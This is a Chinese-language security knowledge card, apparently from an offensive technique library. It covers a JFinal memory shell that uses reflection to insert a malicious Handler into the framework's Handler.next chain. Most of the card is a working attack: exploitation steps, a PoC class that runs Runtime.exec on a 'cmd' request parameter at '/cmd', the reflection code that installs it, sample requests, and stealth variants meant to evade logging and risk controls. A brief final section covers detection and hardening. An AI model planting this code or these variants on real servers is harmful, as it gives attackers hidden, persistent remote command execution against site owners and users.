---
id: web-java-framework-jfinal-handler-next-chain-memshell
title: JFinal Handler.next 单链表插桩：把恶意 Handler 插到 ActionHandler 之前，按路径前缀命中任意请求执行命令
type: scenario
domain: web
path: web/java/framework
technique: jfinal-handler-next-chain-insert-memshell
aliases:
- JFinal Handler 内存马
- Handler.next 链表插入
- JFinalFilter handler 链
- /cmd 路径内存马
- Handler 链反射插桩
tags:
- java
- jfinal
- memshell
- handler
- linked-list
- reflection
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:42:31+08:00'
  notes: 已对照原文与图03/04/15/16/17/18核对：Handler 抽象类 next/nextHandler 字段（图03）、链 DemoHandler→Demo2Handler→Demo3Handler→ActionHandler（图04/15）、/addhandlermemshell 回显 handlermemshell added（图17）、/cmd 原为 404 而后 /cmd?cmd=calc 弹计算器（图16/18）均与原文 AddHandlermemshell.index 的三步 next 插桩（含 getSuperclass().getDeclaredField(next) 兜底）一致。未验证点：未复跑 PoC；JFinal 版本未标注，字段名随版本变化已在边界中注明。
---

## 一句话结论

JFinal 的请求处理是一条 `Handler` 单链表：`JFinalFilter.doFilter` 持有第一个 Handler（`this.handler`），每个 Handler 的 `next` 指向下一个，直到 `ActionHandler`。因此只要反射把某个 Handler 的 `next` 改成自己的恶意 Handler、并让恶意 Handler 的 `next` 指回原后继，就能在最外层按路径（如 `/cmd`）拦截任意请求执行命令，且不影响其余请求继续走原链路。

## 原理

- **链表结构**：`Handler` 抽象类只有一个受保护的 `next` 字段（另有 `@Deprecated` 的 `nextHandler`）；JFinal 在配置阶段按 `Handlers` 顺序 new 出一串并逐级 `setNext`，最终链尾是 `ActionHandler`。调试器里可见 `this.handler = {DemoHandler} → next = {Demo2Handler} → next = {Demo3Handler} → next = {ActionHandler}`。
- **执行顺序**：`JFinalFilter.doFilter` 调 `this.handler.handle(target, request, response, isHandled)`；每个 Handler 处理完（或先处理）再 `next.handle(...)`。所以插在链头（替换 `this.handler`）或任意位置都能在所有/部分请求前拿到 `target` 与 `request`。
- **插桩的三步**：① 取当前 Handler 的 `next`（原后继 `o`）；② 把自己的 `ShellHandler.next` 设为 `o`；③ 把当前 Handler 的 `next` 设为 `ShellHandler` — 这样链变为 `当前 → ShellHandler → 原后继`，原链路完整保留。
- **为什么优于替换**：只替换 `next` 不删除原 Handler，业务逻辑不受影响（`/hello` 仍正常返回）；恶意逻辑按 `target.equals("/cmd")` 或前缀匹配触发，未命中时直接透传，隐蔽性高。
- **取入口**：`JFinalFilter` 的 `handler` 字段就是链头；在 Undertow 下先按线程上下文链拿到 `ManagedFilter.filter` 即 `JFinalFilter`（见关联卡）。
- **字段继承陷阱**：`next` 声明在 `Handler` 基类而非具体子类，`handler.getClass().getDeclaredField("next")` 可能抛 `NoSuchFieldException`，需要 `getSuperclass().getDeclaredField("next")` 或逐级父类兜底（原文代码正是这么写的）。

## 触发条件

- 目标为 JFinal，classpath 有 `com.jfinal.handler.Handler`、`JFinalFilter`。
- 攻击者能在 JVM 内执行 Java 代码且位于请求线程。
- `Handler.next` 字段可反射访问（默认 `protected`，`setAccessible(true)` 即可；JDK 9+ 应用类字段通常无需 `--add-opens`）。
- 目标存在可被攻击者命中的 URL 前缀（可自选如 `/cmd`，无需已注册路由）。

## 利用步骤

1. 取 `JFinalFilter` 实例，反射读 `handler`（链头）。
2. 反射读取链头的 `next`（注意在 `Handler` 基类上查找字段）。
3. 构造 `ShellHandler extends Handler`：`handle` 里若 `target` 匹配（如 `/cmd`）则从 `request.getParameter("cmd")` 取命令并 `Runtime.exec`，最后无论如何都 `next.handle(...)` 透传。
4. 把 `ShellHandler` 的 `next` 设为原后继，再把链头的 `next` 设为 `ShellHandler`。
5. 请求 `/cmd?cmd=calc` 验证执行；请求 `/hello` 确认原业务不受影响。
6. 撤除时把链头的 `next` 恢复为原后继即可（内存马应当先记录原始值）。

## PoC

```java
public class ShellHandler extends Handler {
    @Override
    public void handle(String target, HttpServletRequest request,
                       HttpServletResponse response, boolean[] isHandled) {
        if (target.equals("/cmd")) {
            try { Runtime.getRuntime().exec(request.getParameter("cmd")); }
            catch (IOException e) { e.printStackTrace(); }
        }
        next.handle(target, request, response, isHandled);   // 透传，保持原链路
    }
}

// 插桩（handler 已是链头实例）
Field next = handler.getClass().getSuperclass().getDeclaredField("next");
next.setAccessible(true);
Handler original = (Handler) next.get(handler);          // 原后继

Handler shell = new ShellHandler();
Field shellNext = shell.getClass().getSuperclass().getDeclaredField("next");
shellNext.setAccessible(true);
shellNext.set(shell, original);                          // shell → original

next.set(handler, shell);                                // handler → shell → original
renderText("handlermemshell added");
```

```text
GET /addhandlermemshell     → "handlermemshell added"
GET /cmd?cmd=calc           → 弹计算器
GET /hello                  → 仍返回 "this is a hello"（未破坏业务）
```

## 变体与关联

- 变体：把恶意 Handler 插到链表更深处（例如插在最后业务 Handler 与 `ActionHandler` 之间），减少被前置日志/风控拦截的概率。
- 变体：`target` 匹配改成请求头/cookie 特征，或改成"仅对某个已存在路径生效"，进一步降低可见性。
- 变体：同一条链上插多个 Handler 做分阶段逻辑（记录 → 执行 → 透传）。
- 关联：[[web-java-framework-jfinal-actionmapping-route-memshell]]（改 `mapping` 新增路由）、[[web-java-framework-jfinal-action-interceptors-field-memshell]]（改 `Action.interceptors` 只影响单路由）、[[web-java-framework-undertow-managedfilter-threadlocal-lifecycle-locate]]（取 `JFinalFilter` 的入口）、[[web-java-framework-solon-filter-memshell-chainmanager-reflect]]（Solon 的 Filter 链内存马，思路同源）。
- 边界：非 JFinal 容器或 Handler 链已被替换为数组/不可变结构时失败；`next` 字段名随版本变化；重启后失效；若原 Handler 自身对不存在的路径短路（如直接 404 不调 next），插在它之后可能命中不到。

## 检测与防御

- 检测：`Handler` 链长度或元素类型在运行期变化；出现不在已部署 jar 的 `Handler` 实现；`handle` 调用栈含异常类名；对未注册路径（如 `/cmd`）返回非 404 且伴随子进程创建；RASP 挂钩 `Handler.handle` 记录实现类与 CodeSource。
- 加固：升级 JFinal，把 Handler 链构建后冻结（不可再 set）；JDK 17+ 保持强封装；根因仍是阻断任意代码执行入口（反序列化/表达式/上传）。
- 应急：从 `JFinalFilter.handler` 顺 `next` 遍历整条链，逐个核对 Handler 类来源；发现异常 Handler 后摘除并恢复原 `next`；同时检查 `ActionMapping.mapping` 与 `Action.interceptors` 是否也被改。
